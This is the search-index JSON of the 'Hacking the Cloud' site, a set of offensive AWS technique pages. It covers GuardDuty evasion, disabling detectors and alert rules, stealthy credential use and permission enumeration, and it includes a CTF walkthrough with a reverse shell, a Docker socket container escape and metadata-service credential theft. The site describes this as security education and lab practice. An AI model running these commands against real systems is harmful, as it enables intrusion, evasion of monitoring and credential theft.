{"config":{"indexing":"full","jieba_dict":null,"jieba_dict_user":null,"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"<p>Hacking the cloud is an encyclopedia of the attacks/tactics/techniques that offensive security professionals can use on their next cloud exploitation adventure. The goal is to share this knowledge with the security community to better defend cloud native technologies.</p> <p>All content on this site is created by volunteers. If you'd like to be one of them, you can contribute your knowledge by submitting a Pull Request. We are open to content from any major cloud provider and will also accept cloud-related technologies as well (Docker, Terraform, K8s, etc.). Additionally you are encouraged to update/modify/improve existing pages as well.</p> <p>Topics can include offensive techniques, tools, general knowledge related to cloud security, etc. Defensive knowledge is also welcome! At the end of the day the primary goal is to make the cloud safer, and defenders are welcome to submit content all the same.</p> <p>Don't worry about submitting content in the wrong format or what section it should be a part of, we can always make improvements later :) When writing content: do try to credit the researcher who discovered it and link to their site/talk.</p>","title":"Home"},{"location":"#disclaimer","text":"<p>The information provided by Hacking the Cloud is intended to be used by professionals who are authorized to perform security assessments or by those defending cloud environments. While these techniques can be used to avoid detection, escalate privileges, compromise resources, etc. the intent is to improve security by making the knowledge of these techniques more generally available.</p>","title":"Disclaimer"},{"location":"#roadmap","text":"<p>Currently the site has some material on AWS, and very little for Azure or GCP. If you have experience in any of those areas you are welcome to submit content. Even something as small as fixing grammar mistakes or adding a screenshot is appreciated!</p> <p>Please checkout the GitHub page for more!</p>","title":"Roadmap"},{"location":"aws/avoiding-detection/guardduty-pentest/","text":"<p>When making AWS API requests on common penetration testing OS's GuardDuty will detect this and trigger a PenTest Finding.</p> <p>This is caused by the user agent name that is passed in the API request. By modifying that we can prevent GuardDuty from detecting that we are operating from a \"pentest\" Linux distribution.</p>  <p>Warning</p> <p>If your assessment requires you to remain undetected it's probably easier to leverage a \"safe\" OS like Ubuntu, Mac OS, or Windows.</p>  <p>To do this, identify the location of your <code>session.py</code> in the <code>botocore</code> package. For example, on a default Kali Linux install it can be found at <code>/usr/local/lib/python3.7/dist-packages/botocore/session.py</code>.</p> <p>On line 456 (at the time of writing), you should see the following.</p>  <p></p>  <p><code>platform.system()</code> and <code>platform.release()</code> are similar to <code>uname -o</code> and <code>uname -r</code>. On a stock Kali install it will generate the following values.</p>  <p></p>  <p>To get around this, modify the code and replace it with legitimate user agent strings like those found in Pacu. With this capability you can mask your user agent to look like anything you want. Even arbitrary values like below.</p>  <p></p>","title":"Bypass GuardDuty Pentest Findings"},{"location":"aws/avoiding-detection/guardduty-tor-client/","text":"<p>UnauthorizedAccess:EC2/TorClient is a high severity GuardDuty finding that fires when an EC2 instance is detected making connections to Tor Guard or Authority nodes. According to the documentation, \"this finding may indicate unauthorized access to your AWS resources with the intent of hiding the attacker's true identity\".</p> <p>AWS determines this by comparing connections to the public list of Tor nodes. To those familiar with the Tor project, this is a common problem. Countries, internet service providers, and other authorities may block access to the Tor network making it difficult for citizens to access the open internet.</p> <p>From a technical perspective the Tor Project has largely gotten around this by using Bridges. Bridges are special nodes that do not disclose themselves like other Tor nodes do. Individuals who would normally have difficulty connecting directly to Tor can instead route their traffic through Bridge nodes. Similarly, we can bypass the Tor Client GuardDuty finding by using bridges.</p> <p>To do so, download the Tor and obfs4proxy binaries (the simplest way to do this on a Debian based system is <code>apt install tor obfs4proxy</code> and move them to your target). Obfs4 is a Pluggable Transport which modifies Tor traffic to communicate with a bridge. Navigate to bridges.torproject.org to get a bridge address. </p> <p>From here, create a torrc file with the following contents (being sure to fill in the information you got for the bridge address):</p> <pre><code>UseBridges 1\nBridge obfs4 *ip address*:*port* *fingerprint* cert=*cert string* iat-mode=0\nClientTransportPlugin obfs4 exec /bin/obfs4proxy\n</code></pre> <p>You will now be able to connect to the Tor network with <code>tor -f torrc</code> and you can connect to the Socks5 proxy on port 9050 (by default).</p>","title":"Bypass GuardDuty Tor Client Findings"},{"location":"aws/avoiding-detection/modify-guardduty-config/","text":"<p>When an account has been successfully compromised, an attacker can modify threat detection services like GuardDuty to reduce the likelihood of their actions triggering an alert. Modifying, as opposed to outright deleting, key attributes of GuardDuty may be less likely to raise alerts, and result in a similar degradation of effectiveness.  The actions available to an attacker will largely depend on the compromised permissions available to the attacker, the GuardDuty architecture and the presence of higher level controls like Service Control Policies. </p> <p>Where GuardDuty uses a delegated admin or invite model, features like detector configurations and IP Trust lists are centrally managed, and so they can only be modified in the GuardDuty administrator account. Where this is not the case, these features can be modified in the account that GuardDuty is running in.</p>","title":"Modify GuardDuty Configuration"},{"location":"aws/avoiding-detection/modify-guardduty-config/#misconfiguring-the-detector","text":"<p>An attacker could modify an existing GuardDuty detector in the account, to remove log sources or lessen its effectiveness.</p> <p>Configuration changes may include a combination of:</p> <ul> <li>Disabling the detector altogether.  </li> <li>Removing Kubernetes and s3 as data sources, which removes all S3 Protection and Kubernetes alerts.  </li> <li>Increasing the event update frequency to 6 hours, as opposed to as low as 15 minutes.</li> </ul> <p>Required permissions to execute:</p> <ul> <li>guardduty:ListDetectors</li> <li>guardduty:UpdateDetector</li> </ul> <p>Example CLI commands <pre><code># Disabling the detector\naws guardduty update-detector \\\n    --detector-id 12abc34d567e8fa901bc2d34eexample \\\n    --no-enable \n\n# Removing s3 as a log source\naws guardduty update-detector \\\n    --detector-id 12abc34d567e8fa901bc2d34eexample \\\n    --data-sources S3Logs={Enable=false}\n\n# Increase finding update time to 6 hours\naws guardduty update-detector \\\n    --detector-id 12abc34d567e8fa901bc2d34eexample \\\n    --finding-publishing-frequency SIX_HOURS\n</code></pre></p>","title":"Misconfiguring the Detector"},{"location":"aws/avoiding-detection/modify-guardduty-config/#modifying-trusted-ip-lists","text":"<p>An attacker could create or update GuardDuty's Trusted IP list, including their own IP on the list.  Any IPs in a trusted IP list will not have any Cloudtrail or VPC flow log alerts raised against them. </p> <p>DNS findings are exempt from the Trusted IP list.</p> <p>Required permissions to execute:</p> <ul> <li>guardduty:ListDetectors</li> <li>guardduty:ListIPSet</li> <li>iam:PutRolePolicy</li> <li>guardduty:CreateIPSet (To create new list)</li> <li>guardduty:UpdateIPSet (To update an existing list)</li> </ul> <p>Depending on the level of stealth required, the file can be uploaded to an s3 bucket in the target account, or an account controlled by the attacker.</p> <p>Example CLI commands <pre><code>aws guardduty update-ip-set \\\n    --detector-id 12abc34d567e8fa901bc2d34eexample \\\n    --ip-set-id 24adjigdk34290840348exampleiplist \\\n    --location https://malicious-bucket.s3-us-east-1.amazonaws.com/customiplist.csv \\\n    --activate\n</code></pre></p>","title":"Modifying Trusted IP Lists"},{"location":"aws/avoiding-detection/modify-guardduty-config/#modify-cloudwatch-events-rule","text":"<p>GuardDuty populates its findings to Cloudwatch Events on a 5 minute cadence.  Modifying the Event pattern or Targets for an event may reduce GuardDuty's ability to alert and trigger auto-remediation of findings, especially where the remediation is triggered in a member account as GuardDuty administrator protections do not extend to the Cloudwatch events in the member account. </p>  <p>Note</p> <p>In a delegated or invitational admin GuardDuty architecture, cloudwatch events will still be created in the admin account.</p>  <p>Required permissions to execute:</p> <ul> <li>event:ListRules</li> <li>event:ListTargetsByRule</li> <li>event:PutRule</li> <li>event:RemoveTargets</li> </ul> <p>Example CLI commands <pre><code># Disable GuardDuty Cloudwatch Event\naws events put-rule --name guardduty-event \\\n--event-pattern \"{\\\"source\\\":[\\\"aws.guardduty\\\"]}\" \\\n--state DISABLED\n\n# Modify Event Pattern\naws events put-rule --name guardduty-event \\\n--event-pattern '{\"source\": [\"aws.somethingthatdoesntexist\"]}'\n\n# Remove Event Targets\naws events remove-targets --name guardduty-event \\\n--ids \"GuardDutyTarget\"\n</code></pre></p>","title":"Modify Cloudwatch events rule"},{"location":"aws/avoiding-detection/modify-guardduty-config/#supression-rules","text":"<p>Newly create GuardDuty findings can be automatically archived via Suppression Rules. An adversary could use filters to automatically archive findings they are likely to generate. </p> <p>Required permissions to execute:</p> <ul> <li>guardduty:CreateFilter</li> </ul> <p>Example CLI commands</p> <pre><code>aws  guardduty create-filter --action ARCHIVE --detector-id 12abc34d567e8fa901bc2d34e56789f0 --name yourfiltername --finding-criteria file://criteria.json\n</code></pre> <p>Filters can be created using the CreateFilter API.</p>","title":"Supression Rules"},{"location":"aws/avoiding-detection/modify-guardduty-config/#delete-publishing-destination","text":"<p>An adversary could disable alerting simply by deleting the destination of alerts.</p> <p>Required permissions to execute:</p> <ul> <li>guardduty:DeletePublishingDestination</li> </ul> <p>Example CLI commands</p> <pre><code>aws guardduty delete-publishing-destination --detector-id abc123 --destination-id def456\n</code></pre>","title":"Delete Publishing Destination"},{"location":"aws/avoiding-detection/steal-keys-undetected/","text":"<p>Link to Tool: SneakyEndpoints</p> <p>A common technique when exploiting AWS environments is leveraging SSRF, XXE, command injection, etc. to steal IAM credentials from the instance metadata service of a target EC2 instance. This can allow you to execute AWS API calls within the victim's account, however, it comes with a risk. If you were to try to use those credentials outside of that host (for example, from your laptop) an alert would be triggered. There is a GuardDuty finding which detects when IAM credentials are being used outside of EC2 called UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS.</p> <p>To get around this alert being triggered, attackers could use the stolen credentials from the attacker's EC2 instance. The alert only detected if the credentials were used outside of EC2, not the victim's specific EC2 instance. So by using their own, or exploiting another EC2 instance, attackers could bypass the GuardDuty alert.</p> <p>On January 20th 2022, AWS released a new GuardDuty finding called UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS. This new finding addressed the shortcomings of the previous one. Now, when IAM credentials are used from ANY EC2, if those credentials don't belong to the same account as the EC2 instance using them, it triggers the alert. Thus, simply using your own EC2 instance is no longer viable. This addresses a long standing concern within the cloud security community.</p> <p>However, there is currently a functioning bypass for this - VPC Endpoints. Using VPC Endpoints will not trigger the GuardDuty alert. What this means is that, as an attacker, <code>if you steal IAM credentials from an EC2 instance, you can use those credentials from your own EC2 instance while routing traffic through VPC Endpoints. This will not trigger the GuardDuty finding</code>.</p> <p>To make this setup faster (and easier) for Penetration Testers and Red Teamers, SneakyEndpoints was created. This project has all the Terraform configurations necessary to spin up an environment to attack from. It will create an EC2 instance in a private subnet (no internet access) and create a number of VPC Endpoints for you to use. This setup ensures we don't accidentally expose ourselves and trigger the alert.</p>  <p>Note</p> <p>There is another bypass option, however, it would only be useful in niche scenarios. The InstanceCredentialExfiltration finding is only tied to the AWS account, not the EC2 instance. As a result, if you compromise an EC2 instance in the target account and then compromise OTHER EC2 instances in the account, or steal their IAM credentials, you can safely use them from the initially compromised instance without fear of triggering GuardDuty.</p>","title":"Bypass Credential Exfiltration Detection"},{"location":"aws/capture_the_flag/cicdont/","text":"<p>Link to Project: CI/CDon't</p>  <p>Note</p> <p>This project will deploy intentionally vulnerable software/infrastructure to your AWS account. Please ensure there is no sensitive or irrecoverable data in the account. Attempts have been made to mitigate this however they may not be fullproof; Security Group rules only allow access to the vulnerable EC2 instance from your public IP address, and a randomly generated password is required to access it.</p>   <p>Warning</p> <p>If you intend to play the CTF it is a good idea to read through this page carefully to ensure you have all the details (minus the walkthrough). This page will familiarize the player with how the CTF works, what the objective is, and what the storyline is.</p>","title":"CI/CDon't"},{"location":"aws/capture_the_flag/cicdont/#background","text":"<p>This is an AWS/GitLab CI/CD themed CTF that you can run in your own AWS account. All that is required is an AWS account and Terraform installed locally on your machine.</p> <p>Costs should be minimal; running this infrastructure in my own account for three hours didn't accrue a cent in the Billing Dashboard, however extended time frames may cause costs to add up.</p> <p>In terms of difficulty, it would be rated low. The goal is more about having fun and working through some simple CI/CD/AWS challenges that even non-security folks would enjoy.</p>","title":"Background"},{"location":"aws/capture_the_flag/cicdont/#how-to-play","text":"<p>Clone this repository and navigate to the cicdont directory.</p> <pre><code>git clone https://github.com/Hacking-the-Cloud/htc-ctfs.git\ncd htc-ctfs/aws/cicdont\n</code></pre> <p>To deploy the CTF environment run the Terraform init/apply command.</p> <pre><code>terraform init\nterraform apply\n</code></pre> <p>You will be prompted with two questions. The first is a consent related to the costs of the CTF (Again, these should be minimal however the environment should still be taken down when you're finished with it). The second is asking your player name. Please do not use special characters in the name, only upper and lower case letters. This will be used in the game.</p>  <p>Note</p> <p>It will take approximately 10 minutes for all the infrastructure to be deployed and ready. This 10 minute timer begins AFTER the Terraform apply has completed. This time is used to install all the software, create the NPCs, etc.</p>   <p>Warning</p> <p>To be able to access the vulnerable instance, Terraform will attempt to determine your public IP address and create a security group that only that IP address can access. If you cannot access the target_ip (explained below) after 10 minutes, check the AWS console for a security group named <code>allow_http</code> and ensure that its configuration would allow you to reach it.</p>  <p>To destroy the CTF environment run the Terraform destroy command.</p> <pre><code>terraform destroy\n</code></pre> <p>This will again prompt you for the two questions. Please answer them and the infrastructure will be destroyed.</p>","title":"How to Play"},{"location":"aws/capture_the_flag/cicdont/#the-important-bits","text":"<p>Once you've run terraform apply, you will receive 5 outputs. This will include the following:</p> <ul> <li>Player Username</li> <li>Player Password (randomly generated)</li> <li>Attackbox IP</li> <li>Target IP</li> <li>Time warning</li> </ul> <p>The attackbox is an EC2 instance you can use for whatever purposes you deem fit. In particular you can use it to catch a reverse shell, or load your C2 platform of choice on it (you have sudo access via the password).</p> <p>To access the attackbox, you can ssh using your player username and password.</p> <pre><code>ssh &lt;player username&gt;@&lt;attackbox IP&gt;\n</code></pre>  <p>Note</p> <p>When sshing with a player username, note that the username is case-sensitive.</p>  <p>It will take approximately 10 minutes for all the infrastructure to finish deploying. If you'd like to test if it's finished, you can navigate to <code>http://&lt;target IP&gt;/</code>. If it doesn't respond, or only shows a generic GitLab login page, then the CTF is not ready yet. If you see a message about SoftHouseIO, then everything is setup and ready.</p>  <p>Note</p> <p>To be able to access the vulnerable instance, Terraform will attempt to determine your public IP address and create security group rules that only that IP address can access. If you cannot access the target instance after 10 minutes (likely shorter), check the AWS console for a security group named <code>allow_http</code> and ensure that it's configuration would allow you to reach it.</p> <p>These security group rules apply to both the target (GitLab) and the attackbox. Additionally, the rules are configured to allow the attackbox to receive incoming traffic from the target (to catch shells).</p>  <p>If you see any references to <code>gamemaster</code>, please ignore it. Those scripts are used to simulate the NPCs and have them complete their lore tasks. It is unrelated to the challenge.</p>","title":"The Important Bits"},{"location":"aws/capture_the_flag/cicdont/#the-story","text":"<p>You are &lt;player username&gt;, a developer at SoftHouseIO, an independent software development consultancy firm. While you like the company, you're thinking about making a little money on the side, perhaps through not entirely legal means. Can you say ransomware?</p> <p>After planning your attack you figure the best place to get started is the company GitLab server at http://&lt;target IP&gt;. Your username and password should you get you in. You'll want to gain access to administrative credentials for the AWS account the company uses.</p>","title":"The Story"},{"location":"aws/capture_the_flag/cicdont/#the-objective","text":"<p>Gain access to the <code>aws_admin_automation_user</code> through whatever means necessary (Note that this role has no permissions. It is simply the goal).</p>","title":"The Objective"},{"location":"aws/capture_the_flag/cicdont/#feedback","text":"<p>Want to provide feedback on the challenge? Open a new discussion on GitHub</p>","title":"Feedback"},{"location":"aws/capture_the_flag/cicdont/#walkthrough","text":"<p>The following is a step by step walkthrough of the CTF. You can refer to this if you get stuck or simply just want to know what is next. Click the summary below to expand it.</p>  Summary <p>Consent and Name</p> <p>To begin the CTF we must first stand up all the infrastructure. We do this using Terraform.</p> <p>Download the challenge using git. <pre><code>git clone https://github.com/Hacking-the-Cloud/htc-ctfs.git\ncd htc-ctfs/aws/cicdont\n</code></pre></p> <p>Initialize the project. <pre><code>terraform init\n</code></pre></p> <p>Create the infrastructure. <pre><code>terraform apply\n</code></pre></p> <p>We will be prompted first with a consent. Read through the question and answer with yes or no.</p> <p>After this, it will ask for a player name. Please only use lower and uppercase letters. No special characters or numbers.</p> <p></p> <p>After this, you will be asked if you'd like to perform the deployment. Answer with \"yes\".</p> <p>The Terraform deployment will begin.</p> <p>Wait</p>  <p>Note</p> <p>You will now need to wait 10 minutes for the deployment to finish. The 10 minute timer starts AFTER you get the \"Apply complete\" notification.</p>  <p></p> <p>Does it really take 10 minutes? Yes, it takes a little bit to get everything setup. You can take this time to get familiar with your attackbox. This is an EC2 instance you can use for whatever you need during the CTF, particularly to catch shells.</p> <p>You can ssh into the box using your username and password</p> <pre><code>ssh &lt;player_username&gt;@&lt;target_ip&gt;\n</code></pre>  <p>Note</p> <p>The username is case-sensitive.</p>  <p>Getting Started</p> <p>After waiting those 10 minutes, you finally have a target. You can navigate to the target_ip to see a GitLab instance. Log in using your player username and password.</p> <p></p> <p>From here, you can navigate around, explore the various projects, and more. You might even notice a little notification in the upper right hand corner.</p> <p></p> <p>Ashley has some work for us! Perhaps this will give us a hint for something we can exploit.</p> <p>Navigate to the mvp-docker project's Issues page.</p> <p></p> <p>This is interesting for a few reasons. Most notably, Ashley wants some help with building a Docker container as a part of the CI/CD pipeline. She also mentions a gitlab-ci.yml file, which is the configuration for the GitLab CI/CD pipeline.</p> <p>Building Docker images as a part of a CI/CD pipeline can have serious security implications and this is definitely worth looking into.</p> <p>Before we can get to that fun, let's take a look at that gitlab-ci.yml file. Navigate there and make some changes (you can edit the file through the web browser if you prefer or you can clone the project locally).</p> <p></p> <p>After committing changes (via the web interface or otherwise) you can navigate to the <code>CI/CD</code> tab on the left to see the pipeline execute.</p> <p>Clicking on the status, and then the build job we can see the output.</p> <p></p> <p>This can tell us a few things that are very useful to us as attackers. First, on line 3, we see that the CI/CD pipeline is using the \"docker\" executor, meaning everything executes inside a Docker container somewhere. On line 6, we see that it is using an Ubuntu Docker image. And lines 20+ show us that our input is executing in this environment.</p> <p>This looks like a fantastic place to start.</p> <p>Getting a Reverse Shell</p> <p>Our next step will be to get a shell in this environment. This is where our attackbox can come in.</p> <p>Please note: You are welcome to use your C2 platform of choice (If you'd like a recommendation, I'm a fan of Mythic). For this walkthrough I will use netcat for simplicity.</p> <p>SSH into your attack box and install a tool called <code>ncat</code>.</p> <p></p> <p>Now, we can setup a listener (from the attackbox) with the following command.</p> <pre><code>sudo ncat -l 443 --ssl -v\n</code></pre> <p>We can now go back and edit the gitlab-ci.yml file to send a reverse shell. Using Ncat it's as easy as adding the following lines. From our previous foray we know this is an Ubuntu Docker container, and thus, we can use the apt package manager.</p> <pre><code>apt update\napt install -y ncat\nncat &lt;attackbox_ip&gt; 443 --ssl -e /bin/bash -v\n</code></pre> <p></p> <p>Now click \"Commit changes\" and watch that pipeline run.</p> <p>You are now the proud owner of a reverse shell inside this Docker container.</p> <p></p> <p>Docker Socket</p> <p>From here, there are a number of things we could try to do. Your first instinct may be, \"I'm on an EC2 instance, can I reach the metadata service?\". That's a great idea! Unfortunately you can't.</p> <p>The bright folks over at SoftHouseIO use IMDSv2, one of the benefits of which is that Docker containers cannot reach it by default.</p> <pre><code>TTL of 1: The default configuration of IMDSv2 is to set the Time To Live (TTL) of the TCP packet containing the session token to \"1\". This ensures that misconfigured network appliances (firewalls, NAT devices, routers, etc.) will not forward the packet on. This also means that Docker containers using the default networking configuration (bridge mode) will not be able to reach the instance metadata service.\n</code></pre> <p>That's a bummer. Other options? Try and pivot off this machine to something else in the VPC? Access a service exposed internally to the host (172.17.0.1)? Escape the container?</p> <p>That last one might get us somewhere. Ashley mentioned having some issues about building a Docker container in the pipeline. To do that, wouldn't they have to use something like kaniko? What if they just exposed the Docker socket instead?</p> <p>When a Docker socket is exposed inside a container, it can have dangerous consequences as an attacker can potentially escape the container and escalate privileges on the host.</p> <p>The common location for the socket is at <code>/var/run/docker.sock</code>, let's go look for it.</p> <p></p> <p>There we go! They did mount the Docker socket! Let's use this to escape the container.</p> <p>Escaping the Container</p> <p>Note: There are many different ways you could abuse this to escape the container. I will walk through what I think is the simplest.</p> <p>First let's install two tools that will make things easier for ourselves.</p> <pre><code>apt update\napt install -y python3 docker.io\n</code></pre> <p>Python3 will help us to spawn a <code>tty</code> and having the Docker binary will make it easier to interact with the Docker socket. We could alternatively use curl.</p> <p>With those two tools installed, let's spawn a <code>tty</code> with the classic Python one-liner.</p> <pre><code>python3 -c \"import pty;pty.spawn('/bin/bash')\"\n</code></pre> <p></p> <p>Doesn't that looks so much better? We have an actual shell prompt now. This will be useful for interacting with the Docker socket. Speaking of which, let's see which Docker containers are running on the host.</p> <pre><code>docker ps\n</code></pre> <p>This output lets us know that everything is working as intended. With access to the Docker socket, let's escape by creating a privileged Docker container (Note: There are a number of options to do this).</p> <pre><code>docker run -it --rm --pid=host --privileged ubuntu bash\n</code></pre> <p>Now, inside our new privileged container, let's migrate to the namespace of a process running on the host.</p> <pre><code>nsenter --target 1 --mount --uts --ipc --net --pid -- bash\n</code></pre> <p></p> <p>How fun is that?! We now have root on the underlying host and have escaped the container.</p> <p>Escalating</p> <p>With root on the host, we have a number of options for next steps. We can steal IAM credentials from the metadata service, brute force our IAM permissions, enumerate roles in the account to find out what services are running in the account, attempt to escalate IAM privileges, maybe try to intercept the SSM agent if it's running on the box? One place we should check before doing all that is the user data.</p> <p>User data is used to run commands when an EC2 instance is first started or after it is rebooted (with the right configuration). This can be very helpful to determine what software is installed on the machine, and it can also potentially be a source of credentials from developers who aren't very careful.</p> <p>Let's check this (remember we are using IMDSv2).</p> <pre><code>TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" -v http://169.254.169.254/latest/user-data/\n</code></pre> <p></p> <p>On first glance it appears pretty standard; It installs GitLab, installs the GitLab runners, activates them, etc.</p> <p>There is a slight problem though, on the line where they installed GitLab, they accidentally leaked a credential. An important one at that. That is the credential to the root user of GitLab.</p> <p>This is bad news for SoftHouseIO and great news for us. Let's use this to log into the GitLab web UI as an administrator (username: root, password: &lt;what's in the useradata&gt;)</p> <p>After exploring around for a little while, you may stumble into the the <code>infra-deployer</code> project. That sounds important.</p> <p></p> <p>\"Admin IAM Credentials are being stored in environment variables to be used with the GitLab runners\". That sounds.....very interesting. The good news is that as an administrator, we can see those variables. Navigate to the <code>Settings</code> tab on the left and then click <code>CI/CD</code>. Next, click <code>Expand</code> on the <code>Variables</code> section.</p> <p></p> <p>An Access Key and a Secret Access Key! Let's see who they belong to (you can also do this without logging to CloudTrail if you were so inclined).</p> <pre><code>export AWS_ACCESS_KEY_ID=AKIA....\nexport AWS_SECRET_ACCESS_KEY=....\naws sts get-caller-identity\n</code></pre> <p></p> <p>And with that we have achieved our objective! Congratulations on completing the CTF. Want to provide some feedback? Feel free to open a discussion on GitHub.</p>","title":"Walkthrough"},{"location":"aws/capture_the_flag/cicdont/#acknowledgements","text":"<p>These wonderful folks helped beta-test this CTF and provided feedback.</p> <p>Christophe Tafani-Dereeper Jake Berkowsky Kaushik Pal</p>","title":"Acknowledgements"},{"location":"aws/deprecated/stealth_perm_enum/","text":"<p>Original Research: Nick Frichette Link to Tool: aws_stealth_perm_enum</p>  <p>Warning</p> <p>As of 5/18/2021, this technique has been resolved and fixed by AWS. Mutating the Content-Type header when making API requests no longer can be used to enumerate permissions of a role or user. This page is maintained for historical and inspiration purposes.</p>  <p>After compromising an IAM credential while attacking AWS, your next task will be to determine what permissions that credential has scoped to them.</p> <p>Aside from guessing, enumerating these permissions would typically require a tool to brute force them like enumerate-iam (which is a fantastic tool). The problem of course is that this will generate a ton of CloudTrail logs and will alert any defender. This poses a challenge to us, how can we enumerate permissions in a stealthy manner?  </p> <p>The good news is that there is a bug in the AWS API that affects 589 actions across 39 different AWS services. This bug is a result of a mishandling of the Content-Type header, and when that header is malformed in a specific way the results are not logged to CloudTrail. Based on the response codes/body we can determine if the role does or does not have permission to make that API call.</p> <p>The following services are affected, although please note, that not all actions for these services can be enumerated.  </p>          application-autoscaling appstream   athena autoscaling-plans   aws-marketplace cloudhsm   codecommit codepipeline   codestar comprehend   cur datapipeline   dax discovery   forecast gamelift   health identitystore   kinesis kinesisanalytics   macie mediastore   mgh mturk-requester   opsworks-cm personalize   redshift-data route53domains   route53resolver sagemaker   secretsmanager shield   sms snowball   support tagging   textract translate   workmail      <p>Note</p> <p>For an in depth explanation for the bug, please see the original research. In this article we will just discuss how to take advantage of it.</p>  <p>There are some conditions to the enumeration, and they are defined below.</p> <p>1 - The AWS service uses the JSON 1.1 protocol. 2 - The API actions returns a unique error code depending on the permission set. 3 - The resource associated with that action is set to \"*\".</p> <p>To perform the enumeration there is a script here. Setting the credentials as environment variables and then running the script will inform you what API permissions you have available to you.</p>  <p></p>","title":"Enumerate Permissions without Logging to CloudTrail"},{"location":"aws/deprecated/whoami/","text":"<p>Original Research: Spencer Gietzen</p>  <p>Warning</p> <p>As of August 15, 2020 these calls are now tracked in CloudTrail (tweet). This page is maintained for historical and inspiration purposes.</p>","title":"Whoami - Get Principal Name From Keys"},{"location":"aws/deprecated/whoami/#sdb-list-domains","text":"<p>As found by Spencer Gietzen, the API call for sdb list-domains will return very similar information to get-caller-identity.</p> <pre><code>user@host:$ aws sdb list-domains --region us-east-1\n\nAn error occurred (AuthorizationFailure) when calling the ListDomains operation: User (arn:aws:sts::123456789012:assumed-role/example_role/i-00000000000000000) does not have permission to perform (sdb:ListDomains) on resource (arn:aws:sdb:us-east-1:123456789012:domain/). Contact account owner.\n</code></pre>","title":"sdb list-domains"},{"location":"aws/enumeration/account_id_from_ec2/","text":"<p>With shell or command line access to an EC2 instance, you will be able to determine some key information about the AWS account.</p>","title":"Enumerate AWS Account ID from an EC2 Instance"},{"location":"aws/enumeration/account_id_from_ec2/#get-caller-identity","text":"<p>By using get-caller-identity, the EC2 instance may have an EC2 instance profile setup.</p> <pre><code>user@host:$ aws sts get-caller-identity\n{\n   \"Account\": \"000000000000\",\n   \"UserId\": \"AROAJIWIJQ5KCHMJX4EWI:i-00000000000000000\",\n   \"Arn\": \"arn:aws:sts::000000000000:assumed-role/AmazonLightsailInstanceRole/i-00000000000000000\"\n}\n</code></pre>","title":"get-caller-identity"},{"location":"aws/enumeration/account_id_from_ec2/#metadata","text":"<p>By using the metadata service, you will be able to retrieve additional information about the account, and more specifically for the EC2 instance being used.</p> <p><pre><code>TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/dynamic/instance-identity/document\n</code></pre> The output will reveal additional information. <pre><code>{\n   \"accountId\" : \"000000000000\",\n   \"architecture\" : \"x86_64\",\n   \"availabilityZone\" : \"ap-southeast-2a\",\n   \"billingProducts\" : null,\n   \"devpayProductCodes\" : null,\n   \"marketplaceProductCodes\" : null,\n   \"imageId\" : \"ami-042c4533fa25c105a\",\n   \"instanceId\" : \"i-00000000000000000\",\n   \"instanceType\" : \"t2.nano\",\n   \"kernelId\" : null,\n   \"pendingTime\" : \"2022-02-27T22:34:30Z\",\n   \"privateIp\" : \"172.26.6.225\",\n   \"ramdiskId\" : null,\n   \"region\" : \"ap-southeast-2\",\n   \"version\" : \"2017-09-30\"\n}\n</code></pre></p>","title":"Metadata"},{"location":"aws/enumeration/account_id_from_s3_bucket/","text":"<p>Discovered by Ben Bridts Original Research: link Link to Tool: s3-account-search</p>  <p>Note</p> <p>The documentation and GitHub repository refer to this tool as <code>s3-account-search</code>, however when it is installed using pip, it is named <code>s3-account-finder</code>. Because of this, all the examples below will use the <code>s3-account-finder</code> name.</p>  <p>By leveraging the s3:ResourceAccount policy condition, we can identify the AWS account ID associated with a public S3 bucket. This is possible because it supports wildcards (*). With this, we can sequentially enumerate the account ID.</p> <p>To test this, you can use Grayhat Warfare's list of public S3 buckets.</p> <p>You will need a role with <code>s3:getObject</code> and <code>s3:ListBucket</code> permissions, and you can specify the target bucket as the resource for your policy. Alternatively you can set a resource of '*' to quickly test multiple buckets.</p>","title":"Enumerate AWS Account ID from a Public S3 Bucket"},{"location":"aws/enumeration/account_id_from_s3_bucket/#installation","text":"<p>The tool can be installed with the following command:</p> <pre><code>python3 -m pip install s3-account-search\n</code></pre>","title":"Installation"},{"location":"aws/enumeration/account_id_from_s3_bucket/#setup","text":"<p>To use the tool, there is some setup on your end. You will need your own AWS account with a role you can assume with the <code>s3:GetObject</code> or <code>s3:ListBucket</code> permissions. s3-account-finder will assume this role so make sure the credentials you're using can do this.</p>","title":"Setup"},{"location":"aws/enumeration/account_id_from_s3_bucket/#usage","text":"<pre><code>s3-account-finder arn:aws:iam::123456789123:role/s3-searcher &lt;bucket name&gt;\nStarting search (this can take a while)\nfound: 1\nfound: 12\n*** snip ***\nfound: 123456789123\n</code></pre>  <p>Operational Security Tip</p> <p>The majority of this activity would only be logged to the calling account (the account you are running the tool with), however S3 data events and server access logging can be used to see the API activity. That being said, there is no immediate way to counter or prevent you from doing this. Additionally these requests could be spaced out over an extended period of time, further making it difficult to identify.</p>   <p>Tip</p> <p>Pair this with Unauthenticated Enumeration of IAM Users and Roles!</p>","title":"Usage"},{"location":"aws/enumeration/brute_force_iam_permissions/","text":"<p>Link to Tool: GitHub</p> <p>When attacking AWS you may compromise credentials for an IAM user or role. This can be an excellent step to gain access to other resources, however it presents a problem for us; How do we know what permissions we have access to? While we may have context clues based on the name of the role/user or based on where we found them, this is hardly exhaustive or thorough. </p> <p>This leaves us with basically one option, brute force the permissions. To do this, we will try as many safe API calls as possible, seeing which ones fail and which ones succeed. Those that succeed are the permissions we have available to us. There are several tools to do this, however, here we will be covering enumerate-iam by Andr\u00e9s Riancho.</p> <p>To use enumerate-iam, simply pull a copy of the tool from GitHub, provide the credentials, and watch the magic happen. All calls by enumerate-iam are non-destructive, meaning only get and list operations are used. This reduces the risk of accidentally deleting something in a client's account.</p> <pre><code>user@host:/enum$ ./enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID --secret-key $AWS_SECRET_ACCESS_KEY --session-token $AWS_SESSION_TOKEN\n2020-12-20 18:41:26,375 - 13 - [INFO] Starting permission enumeration for access-key-id 